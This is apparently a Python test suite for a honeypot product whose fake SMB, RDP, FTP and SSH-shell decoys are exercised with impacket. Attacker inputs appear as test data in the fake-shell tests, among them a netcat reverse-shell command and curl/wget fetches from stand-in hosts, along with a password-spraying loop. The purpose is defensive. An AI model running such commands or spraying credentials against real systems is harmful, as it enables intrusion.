"""SMB / RDP / FTP / SSH-shell decoys driven over real sockets (impacket, ftplib) — round-2 fixes B2 B3 B8 B12 B13 B14."""
import ftplib
import io
import os
import socket
import ssl
import struct
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from rpot import baits as B
from rpot.common.config import TokenIndex, load_roles, nt_hash, sensor_token_view
from rpot.console import scoring
from rpot.sensor.base import Ctx, UploadStore, win_version
from test_dc_dns import Em, free_port


def ctx_for(tmp, tokens, co, sensors, name, role):
    s = next(x for x in sensors if x["name"] == name)
    cfg = {"company": co, "tokens": sensor_token_view(tokens, "s4lt", role), "sensors": [s]}
    d = os.path.join(tmp, "data", name)
    os.makedirs(d, exist_ok=True)
    em = Em()
    return Ctx(cfg, s, load_roles()[role], em, TokenIndex(cfg), os.path.join(tmp, "baits", name), d), em


class Lab(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from rpot.sensor.services.catchers import start_rdp
        from rpot.sensor.services.smb import start_smb
        cls.tmp = tempfile.TemporaryDirectory()
        co = B.make_persona("corp.ararat.am", "bank", seed=5)
        co["token_salt"] = "s4lt"
        cls.co = co
        cls.sensors = [{"name": "FS01", "role": "windows-file-server", "ip": "10.9.0.20"},
                       {"name": "DC01", "role": "windows-domain-controller", "ip": "10.9.0.10"},
                       {"name": "WEB01", "role": "linux-web-hosting", "ip": "10.9.0.22"},
                       {"name": "BKP01", "role": "ftp-backup-server", "ip": "10.9.0.23"}]
        cls.tokens = B.generate({"company": co, "console": {}, "sensors": cls.sensors}, os.path.join(cls.tmp.name, "baits"))
        cls.pw = {t["username"]: t["password"] for t in cls.tokens.values() if t["kind"] == "credential"}
        cls.ctx, cls.em = ctx_for(cls.tmp.name, cls.tokens, co, cls.sensors, "FS01", "windows-file-server")
        cls.smb, cls.rdp = free_port(), free_port()
        svc = next(x for x in cls.ctx.role["services"] if x["type"] == "smb")
        start_smb(cls.ctx, dict(svc, port=cls.smb))
        start_rdp(cls.ctx, {"port": cls.rdp})
        time.sleep(0.3)

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def conn(self, user="", pw="", dom=None):
        from impacket.smbconnection import SMBConnection
        c = SMBConnection("FS01", "127.0.0.1", sess_port=self.smb, timeout=5)
        c.login(user, pw, self.co["netbios"] if dom is None else dom)
        return c


class TestPersona(Lab):
    def test_win_version_mapping(self):
        self.assertEqual(win_version("Windows Server 2019 Standard 17763"), (10, 0, 17763))
        self.assertEqual(win_version("Windows Server 2022 Datacenter"), (10, 0, 20348))
        self.assertEqual(win_version("Windows Server 2012 R2 Standard"), (6, 3, 9600))
        self.assertEqual(win_version("Windows Server 2016 Standard 14393"), (10, 0, 14393))
        self.assertEqual(win_version(""), (10, 0, 17763))

    def test_os_version_matches_role_persona(self):
        """B2/B24: NTLM CHALLENGE carries the role's version, not impacket's 255.255 build 65535."""
        c = self.conn()
        self.assertEqual((c.getServerOSMajor(), c.getServerOSMinor(), c.getServerOSBuild()), win_version(self.ctx.os))
        self.assertNotIn("255", c.getServerOS())
        self.assertEqual(c.getServerDNSDomainName(), "corp.ararat.am")
        self.assertEqual(c.getServerName(), "FS01")
        c.logoff()

    def smb2_negotiate(self, dialects=(0x0202, 0x0210, 0x0300, 0x0311)):
        hdr = b"\xfeSMB" + struct.pack("<HHIHHIIQIIQ16s", 64, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, b"\0" * 16)
        body = struct.pack("<HHHHI16sQ", 36, len(dialects), 1, 0, 0, os.urandom(16), 0) + struct.pack(f"<{len(dialects)}H", *dialects)
        r = self.raw(hdr + body)
        self.assertEqual(r[:4], b"\xfeSMB")
        b = r[64:]
        return {"dialect": struct.unpack("<H", b[4:6])[0], "guid": b[8:24], "sec": struct.unpack("<H", b[2:4])[0],
                "start": struct.unpack("<Q", b[48:56])[0], "time": struct.unpack("<Q", b[40:48])[0]}

    def raw(self, pkt):
        s = socket.create_connection(("127.0.0.1", self.smb), 5)
        try:
            s.sendall(struct.pack(">I", len(pkt)) + pkt)
            n = s.recv(4)
            if len(n) < 4:
                return b""
            want, buf = struct.unpack(">I", n)[0], b""
            while len(buf) < want:
                d = s.recv(want - len(buf))
                if not d:
                    break
                buf += d
            return buf
        finally:
            s.close()

    def smb1_negotiate(self, dialects):
        data = b"".join(b"\x02" + d + b"\0" for d in dialects)
        hdr = b"\xffSMB" + bytes([0x72]) + b"\0" * 4 + bytes([0x18]) + struct.pack("<H", 0xC853) + b"\0" * 12 + \
            struct.pack("<HHHH", 0, 0xFEFF, 0, 0)
        return hdr + b"\x00" + struct.pack("<H", len(data)) + data

    def test_smb2_negotiate_fields(self):
        """B2: stable random ServerGUID (not AAAA…), ServerStartTime 0 (Windows 2016+), SMB 2.1 chosen."""
        a, b = self.smb2_negotiate(), self.smb2_negotiate()
        self.assertEqual(a["dialect"], 0x0210)
        self.assertNotEqual(a["guid"], b"A" * 16)
        self.assertEqual(a["guid"], b["guid"])
        self.assertEqual(a["guid"], self.ctx.persona_secret("smb-server-guid")[:16])
        self.assertEqual(a["start"], 0)
        self.assertAlmostEqual((a["time"] - 116444736000000000) / 1e7, time.time(), delta=5)
        self.assertEqual(a["sec"] & 1, 1)
        self.assertEqual(self.smb2_negotiate((0x0202,))["dialect"], 0x0202)

    def test_guid_stable_across_restarts_but_per_install(self):
        c1, _ = ctx_for(self.tmp.name, self.tokens, self.co, self.sensors, "FS01", "windows-file-server")
        self.assertEqual(c1.persona_secret("smb-server-guid"), self.ctx.persona_secret("smb-server-guid"))
        with tempfile.TemporaryDirectory() as other:
            c2, _ = ctx_for(other, self.tokens, self.co, self.sensors, "FS01", "windows-file-server")
            self.assertNotEqual(c2.persona_secret("smb-server-guid"), self.ctx.persona_secret("smb-server-guid"))

    def test_boot_time_plausible_and_stable(self):
        now = time.time()
        bt = self.ctx.boot_time(now)
        self.assertTrue(3 * 86400 <= now - bt <= 40 * 86400, now - bt)
        self.assertEqual(self.ctx.boot_time(now + 3600), bt)          # advances with uptime, boot stays put

    def test_smb1_refused(self):
        """B2: SMB1-only negotiate is dropped (SMB1 disabled); 'SMB 2.???' gets the SMB2 wildcard answer."""
        self.assertEqual(self.raw(self.smb1_negotiate([b"NT LM 0.12"])), b"")
        r = self.raw(self.smb1_negotiate([b"NT LM 0.12", b"SMB 2.002", b"SMB 2.???"]))
        self.assertEqual(r[:4], b"\xfeSMB")
        self.assertEqual(struct.unpack("<H", r[64 + 4:64 + 6])[0], 0x02FF)

    def test_fresh_ntlm_challenge_per_logon(self):
        from impacket import ntlm
        from impacket.smbconnection import SMBConnection
        seen = set()
        for _ in range(2):
            c = SMBConnection("FS01", "127.0.0.1", sess_port=self.smb, timeout=5)
            orig = ntlm.getNTLMSSPType3

            def grab(type1, type2, *a, **k):
                seen.add(ntlm.NTLMAuthChallenge(type2)["challenge"])
                return orig(type1, type2, *a, **k)
            ntlm.getNTLMSSPType3 = grab
            try:
                c.login("", "")
            finally:
                ntlm.getNTLMSSPType3 = orig
        self.assertEqual(len(seen), 2)

    def test_share_list_like_windows(self):
        c = self.conn("svc_backup", self.pw["svc_backup"])         # RC-27: a null session may not enumerate
        shares = {s["shi1_netname"][:-1]: (s["shi1_type"], s["shi1_remark"][:-1]) for s in c.listShares()}
        self.assertEqual(shares["IPC$"], (0x80000003, "Remote IPC"))
        self.assertEqual(shares["ADMIN$"][0], 0x80000000)
        self.assertIn("Finance", shares)                           # original case, not FINANCE
        from impacket.smbconnection import SessionError
        with self.assertRaises(SessionError):
            c.connectTree("C$")
        c.logoff()


class TestSmbAuth(Lab):
    def test_null_session_browses_bait_shares(self):
        c = self.conn()
        self.assertIn("passwords.txt", [f.get_longname() for f in c.listPath("IT", "*")])
        c.logoff()
        self.assertTrue(any(e.get("anonymous") for e in self.em.of("smb.auth")))

    def test_wrong_password_is_logon_failure_and_feeds_spraying(self):
        """B3: any user/password used to log in as guest; now LOGON_FAILURE + auth.failed per try."""
        from impacket.smbconnection import SessionError
        before = len(self.em.of("auth.failed"))
        for u in ("anna.k", "boris.m", "carl.t", "dana.p", "erik.s"):
            with self.assertRaises(SessionError) as e:
                self.conn(u, "Winter2026!")
            self.assertEqual(e.exception.getErrorCode(), 0xC000006D)
        fails = self.em.of("auth.failed")[before:]
        self.assertEqual(len(fails), 5)
        sc, esc = scoring.Scorer(), []
        for f in fails:
            ev = {"ts": "2026-11-11T10:00:00Z", "sensor": "FS01", "src_ip": "10.0.0.66", "dst_port": 445, "proto": "smb",
                  "type": "auth.failed", "data": {"username": f["username"]}}
            esc += sc.escalations(ev)
        self.assertTrue(any(x["type"] == "auth.bruteforce" and x["data"]["kind"] == "password spraying" for x in esc))
        self.assertFalse(any(h.get("username") == "anna.k" for h in self.em.of("honeytoken.used")))

    def test_bait_user_wrong_password_is_attempt_not_l5(self):
        from impacket.smbconnection import SessionError
        n5 = len(self.em.of("honeytoken.used"))
        with self.assertRaises(SessionError):
            self.conn("svc_backup", "wrong-" + self.pw["svc_backup"])
        self.assertEqual(len(self.em.of("honeytoken.used")), n5)
        f = self.em.of("auth.failed")[-1]
        self.assertTrue(f["honey"])
        self.assertEqual(scoring.score({"type": "auth.failed", "data": f}), 4)

    def test_correct_bait_password_logs_in_and_is_l5(self):
        c = self.conn("svc_backup", self.pw["svc_backup"])
        self.assertIn("passwords.txt", [f.get_longname() for f in c.listPath("IT", "*")])
        c.logoff()
        h = self.em.of("honeytoken.used")[-1]
        self.assertEqual(h["username"], "svc_backup")
        self.assertTrue(h["success"])
        self.assertEqual(self.tokens[h["token"]]["username"], "svc_backup")
        self.assertTrue(self.em.of("auth.success"))

    def test_correct_password_of_bait_not_valid_here_refused_but_l5(self):
        """A correct bait password for a credential that is NOT valid on this decoy: L5 (the secret was
        used) but the logon is refused. The planner makes domain accounts valid on the file server too, so
        take FS01 off svc_print's valid_on for this test only."""
        from impacket.smbconnection import SessionError
        tok = next(t for _, t, _ in self.ctx.tokens.ntlm_candidates("svc_print"))
        saved = list(tok.get("valid_on") or [])
        tok["valid_on"] = [v for v in saved if not v.startswith("FS01:")]
        try:
            with self.assertRaises(SessionError):
                self.conn("svc_print", self.pw["svc_print"])
        finally:
            tok["valid_on"] = saved
        h = self.em.of("honeytoken.used")[-1]
        self.assertEqual((h["username"], h["success"]), ("svc_print", False))

    def test_ntlmv1_response_verified(self):
        from impacket import ntlm
        from impacket.smbconnection import SMBConnection
        old = ntlm.USE_NTLMv2
        ntlm.USE_NTLMv2 = False
        try:
            c = SMBConnection("FS01", "127.0.0.1", sess_port=self.smb, timeout=5)
            c.login("srv_localadm", self.pw["srv_localadm"], self.co["netbios"])
            c.logoff()
        finally:
            ntlm.USE_NTLMv2 = old
        self.assertEqual(self.em.of("honeytoken.used")[-1]["username"], "srv_localadm")

    def test_unauthenticated_tree_connect_refused(self):
        """impacket marks a connection authenticated after ANY session setup — even a failed one."""
        from impacket.smbconnection import SMBConnection, SessionError
        c = SMBConnection("FS01", "127.0.0.1", sess_port=self.smb, timeout=5)
        with self.assertRaises(SessionError):
            c.login("nobody", "x")
        with self.assertRaises(Exception):
            c.connectTree("IT")

    def test_srvsvc_pipe_held_open_does_not_block_others(self):
        from impacket.smbconnection import SMBConnection
        hog = SMBConnection("FS01", "127.0.0.1", sess_port=self.smb, timeout=5)
        hog.login("svc_backup", self.pw["svc_backup"], self.co["netbios"])
        tid = hog.connectTree("IPC$")
        hog.openFile(tid, "srvsvc")                                # never closed
        c = self.conn("svc_backup", self.pw["svc_backup"])
        self.assertIn("IT", [s["shi1_netname"][:-1] for s in c.listShares()])
        c.logoff()

    def test_token_view_has_nt_hash_only_for_windows_ntlm_baits(self):
        self.assertEqual(nt_hash("password").hex(), "8846f7eaee8fb117ad06bdd830b7586c")
        win = sensor_token_view(self.tokens, "s4lt", "windows-file-server")
        lin = sensor_token_view(self.tokens, "s4lt", "linux-web-hosting")
        self.assertFalse(any("nt" in t for t in lin.values()))
        names = {self.tokens[k]["username"] for k, t in win.items() if "nt" in t}
        self.assertTrue({"svc_backup", "srv_localadm", "svc_print", "svc_sql"} <= names)
        self.assertFalse(names & {"deploy", "backup", "admin", "webadmin"})     # Linux-only service baits
        blob = repr(win)
        for pw in self.pw.values():
            self.assertNotIn(pw, blob)


class TestSmbUpload(Lab):
    def test_put_to_public_is_stored_inert(self):
        """B13: upload → file.write L4 with sha256, stored 0400 in the upload store, bait tree untouched."""
        import hashlib
        data = b"note from attacker\n"
        c = self.conn()
        c.putFile("Public", "note.txt", io.BytesIO(data).read)
        c.logoff()
        w = [e for e in self.em.of("file.write") if e.get("path") == "Public\\note.txt"][-1]
        sha = hashlib.sha256(data).hexdigest()
        self.assertEqual((w["sha256"], w["stored"], w["bytes"]), (sha, True, len(data)))
        p = os.path.join(self.ctx.data_dir, "uploads", sha)
        self.assertEqual(open(p, "rb").read(), data)
        self.assertEqual(os.stat(p).st_mode & 0o777, 0o400)
        self.assertFalse(os.path.exists(os.path.join(self.ctx.bait_dir, "shares", "Public", "note.txt")))
        self.assertEqual(scoring.score({"type": "file.write", "data": w}), 4)

    def test_put_to_readonly_share_denied_with_event(self):
        from impacket.smbconnection import SessionError
        c = self.conn()
        with self.assertRaises(SessionError) as e:
            c.putFile("IT", "evil.txt", io.BytesIO(b"x").read)
        self.assertEqual(e.exception.getErrorCode(), 0xC0000022)
        c.logoff()
        w = [x for x in self.em.of("file.write") if x.get("path") == "IT\\evil.txt"]
        self.assertTrue(w and w[-1]["denied"])

    def test_quota_shared_with_ftp(self):
        store = UploadStore.of(self.ctx.data_dir)
        old = store.max_files
        store.max_files = len(store.files)
        try:
            c = self.conn()
            c.putFile("Public", "big.bin", io.BytesIO(os.urandom(1000)).read)
            c.logoff()
        finally:
            store.max_files = old
        w = [x for x in self.em.of("file.write") if x.get("path") == "Public\\big.bin"][-1]
        self.assertEqual((w["stored"], w["dropped"]), (False, "file count quota"))
        self.assertFalse(os.path.exists(os.path.join(self.ctx.data_dir, "uploads", w["sha256"])))


class TestUploadStore(unittest.TestCase):
    def test_limits(self):
        with tempfile.TemporaryDirectory() as d:
            st = UploadStore(os.path.join(d, "u"), max_bytes=100, max_files=2, max_file=60)
            self.assertTrue(st.put(b"a" * 50)["stored"])
            self.assertTrue(st.put(b"a" * 50)["stored"])                      # same content: no new quota use
            self.assertEqual(st.put(b"b" * 61)["dropped"], "file too large")
            self.assertEqual(st.put(b"c" * 51)["dropped"], "size quota")
            self.assertTrue(st.put(b"d" * 40)["stored"])
            self.assertEqual(st.put(b"e")["dropped"], "file count quota")
            again = UploadStore(os.path.join(d, "u"), max_bytes=100, max_files=2, max_file=60)
            self.assertEqual((len(again.files), again.used()), (2, 90))         # survives restarts


class TestFtpQuota(unittest.TestCase):
    def test_upload_over_quota_dropped(self):
        """B14: FTP uploads are capped per sensor (count / bytes); beyond it → file.write dropped."""
        from rpot.sensor.services.ftp import start_ftp
        with tempfile.TemporaryDirectory() as tmp:
            co = B.make_persona("corp.ararat.am", "bank", seed=6)
            co["token_salt"] = "s4lt"
            sensors = [{"name": "BKP01", "role": "ftp-backup-server", "ip": "127.0.0.1"}]
            toks = B.generate({"company": co, "console": {}, "sensors": sensors}, os.path.join(tmp, "baits"))
            ctx, em = ctx_for(tmp, toks, co, sensors, "BKP01", "ftp-backup-server")
            pw = next(t["password"] for t in toks.values() if t.get("username") == "backup")
            st = UploadStore.of(ctx.data_dir)
            st.max_bytes = 3000
            port, pp = free_port(), free_port()
            start_ftp(ctx, {"port": port, "pasv_range": [pp, pp]})
            time.sleep(0.2)
            f = ftplib.FTP()
            f.connect("127.0.0.1", port, timeout=5)
            f.login("backup", pw)
            f.storbinary("STOR a.bin", io.BytesIO(os.urandom(2000)))
            with self.assertRaises(ftplib.error_temp):
                f.storbinary("STOR b.bin", io.BytesIO(os.urandom(2000)))
            f.quit()
            w = em.of("file.write")
            self.assertEqual([x["stored"] for x in w], [True, False])
            self.assertEqual(w[1]["dropped"], "size quota")
            self.assertEqual(len(os.listdir(os.path.join(ctx.data_dir, "uploads"))), 2)   # 1 file + .part


class TestRdpNla(Lab):
    def nla(self, user, pw, domain="ARARAT", version=6):
        from impacket import ntlm
        from rpot.sensor.services.catchers import ts_request, ts_request_parse, _read_der
        s = socket.create_connection(("127.0.0.1", self.rdp), 5)
        cookie = f"Cookie: mstshash={user}\r\n".encode()
        neg = bytes([1, 0, 8, 0, 3, 0, 0, 0])
        x224 = bytes([6 + len(cookie) + len(neg), 0xE0, 0, 0, 0, 0, 0]) + cookie + neg
        s.sendall(bytes([3, 0]) + (4 + len(x224)).to_bytes(2, "big") + x224)
        cc = s.recv(64)
        self.assertEqual(struct.unpack("<I", cc[-4:])[0], 2)                  # HYBRID (CredSSP) selected
        c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        c.check_hostname, c.verify_mode = False, ssl.CERT_NONE
        t = c.wrap_socket(s)
        t1 = ntlm.getNTLMSSPType1("WS-ATTACK", "", False)
        t.sendall(ts_request(version, t1.getData()))
        _, chal = ts_request_parse(_read_der(t))
        t3, _ = ntlm.getNTLMSSPType3(t1, chal, user, pw, domain)
        t.sendall(ts_request(version, t3.getData()))
        r = _read_der(t)
        t.close()
        from rpot.sensor.services import ber
        err = ber.as_int(ber.find(ber.find(ber.one(r)[1], 0xA4), 0x02)) & 0xFFFFFFFF if r else None
        return ntlm.NTLMAuthChallenge(chal), err

    def test_rdp_ntlm_info_and_username_captured(self):
        """B12: NLA now yields user / domain / workstation; CHALLENGE shows the persona (rdp-ntlm-info)."""
        chal, err = self.nla("administrator", "Passw0rd")
        self.assertEqual(err, 0xC000006D)
        self.assertEqual(chal["Version"][:4], struct.pack("<BBH", *win_version(self.ctx.os)))
        a = self.em.of("rdp.auth")[-1]
        self.assertEqual((a["username"], a["domain"], a["workstation"]), ("administrator", "ARARAT", "WS-ATTACK"))
        self.assertEqual(self.em.of("auth.failed")[-1]["username"], "administrator")
        self.assertEqual(scoring.score({"type": "rdp.auth", "data": a}), 3)

    def test_rdp_correct_bait_password_is_l5(self):
        _, err = self.nla("svc_backup", self.pw["svc_backup"])
        self.assertEqual(err, 0xC000015B)                                   # logon type not granted
        h = self.em.of("honeytoken.used")[-1]
        self.assertEqual((h["username"], h["password_ok"], h["proto"]), ("svc_backup", True, "rdp"))

    def test_rdp_bait_user_wrong_password_is_l4(self):
        self.nla("svc_backup", "nope")
        f = self.em.of("auth.failed")[-1]
        self.assertEqual((f["username"], f["honey"]), ("svc_backup", True))


class TestFakeShellParsing(unittest.TestCase):
    def setUp(self):
        from rpot.sensor.services.ssh import FakeShell

        class C:
            os, name, role = "Debian GNU/Linux 12 (bookworm)", "BKP01", {"id": "ftp-backup-server"}

            def __init__(s):
                s.events = []

            def emit(s, *a, **k):
                s.events.append((a[0], k))

            boot = time.time() - 9 * 86400 - 120

            def boot_time(s):
                return s.boot
        self.tmp = tempfile.TemporaryDirectory()
        d = self.tmp.name
        os.makedirs(os.path.join(d, "home", "backup"))
        os.makedirs(os.path.join(d, "ftp", "backups"))
        with open(os.path.join(d, "home", "backup", "f"), "w") as f:
            f.write("alpha\nbeta\ngamma\nalpha2\n")
        with open(os.path.join(d, "ftp", "backups", "db_dump.sql"), "w") as f:
            f.write("--\n")
        self.ctx = C()
        self.sh = FakeShell(self.ctx, "backup", d)
        self.sh.NET_DELAY = 0

    def tearDown(self):
        self.tmp.cleanup()

    def test_b8_tells(self):
        r = self.sh.run
        self.assertEqual(r("cat x 2>/dev/null"), "")
        self.assertEqual(r("cat x"), "cat: x: No such file or directory\n")
        self.assertEqual(r("echo $SHELL ${HOME} \"$USER\" '$USER'"), "/bin/bash /home/backup backup $USER\n")
        head = r("ps aux").splitlines()[0].split()
        self.assertEqual(head[:4], ["USER", "PID", "%CPU", "%MEM"])
        self.assertIn("vsftpd", r("ps aux"))
        self.assertIn("Failed to connect to 1.1.1.1 port 80", r("curl http://1.1.1.1"))
        self.assertNotIn("resolve", r("wget http://1.1.1.1/x"))
        self.assertIn("Could not resolve host: evil.example", r("curl http://evil.example/x"))
        self.assertEqual(r("ls /srv/ftp/backups"), "db_dump.sql\n")              # same tree FTP serves
        self.assertEqual(r("ls /srv/ftp"), "backups\n")
        self.assertIn("up 9 days", r("uptime"))

    def test_operators_pipes_redirections(self):
        r = self.sh.run
        self.assertEqual(r("cat ~/f | grep alpha | wc -l"), "2\n")
        self.assertEqual(r("grep -c alpha ~/f"), "2\n")
        self.assertEqual(r("cat ~/f | head -1; cat ~/f | tail -1"), "alpha\nalpha2\n")
        self.assertEqual(r("ls nope 2>&1 | wc -l"), "1\n")
        self.assertEqual(r("ls nope >/dev/null 2>&1 || echo no"), "no\n")
        self.assertEqual(r("true && echo yes || echo no"), "yes\n")
        self.assertEqual(r("false && echo yes; echo $?"), "1\n")
        self.assertEqual(r("X=7; echo $X"), "7\n")
        self.assertEqual(r("echo $(whoami)@$(hostname)"), "backup@bkp01\n")
        self.assertEqual(r("cat < ~/f </dev/null | wc -l"), "0\n")
        self.assertEqual(r("echo hi > /etc/motd"), "-bash: /etc/motd: Permission denied\n")
        self.assertEqual(r("echo a # comment"), "a\n")
        self.assertEqual(r("id; exit; echo never").split("\x04")[1], "")
        self.assertIn("command not found", r("nc -e /bin/sh 10.0.0.1 4444"))


if __name__ == "__main__":
    unittest.main()
